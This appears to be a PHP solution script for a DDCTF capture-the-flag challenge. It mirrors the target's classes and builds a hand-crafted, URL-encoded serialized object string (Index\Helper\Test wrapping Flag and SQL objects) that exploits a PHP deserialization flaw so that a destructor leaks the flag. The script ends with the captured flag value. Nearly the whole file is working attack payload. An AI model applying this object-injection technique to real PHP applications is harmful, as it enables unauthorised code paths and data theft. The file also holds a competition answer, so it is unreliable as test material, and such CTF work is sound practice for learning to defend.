<?php
class SQL
{

}

class Flag
{
    public $sql;

    public function __construct()
    {
        $this->sql=new SQL();
    }
}

class Test
{
    public $user_uuid = "bd4f8f05-e76a-4147-b1c2-8621380c8729";
    public $fl = "sql";

    public function __construct()
    {
        $this->fl = new Flag();
    }

    public function __destruct()
    {
        $this->getflag('ctfuser', $this->user_uuid);
        // $this->setflag('ctfuser', $this->user_uuid);
    }

    public function getflag($m = 'ctfuser', $u = 'default')
    {
        //TODO: check username
        $user=array(
            'name' => $m,
            'id' => $u
        );
        //懒了直接输出给你们了
        // echo 'DDCTF{'.$this->fl->get($user).'}';
    }
}

// $a = new Test();
// echo serialize($a)."\n";
// echo urlencode(urlencode(serialize($a)));

$a = 'O:17:"Index\Helper\Test":2:{s:9:"user_uuid";s:36:"bd4f8f05-e76a-4147-b1c2-8621380c8729";s:2:"fl";O:17:"Index\Helper\Flag":1:{s:3:"sql";O:16:"Index\Helper\SQL":0:{}}';
echo urlencode($a);

// DDCTF{bf6f5f1d348fdbf57c0de492964a4489c345dac207a5529c0fc48f0615a48df7}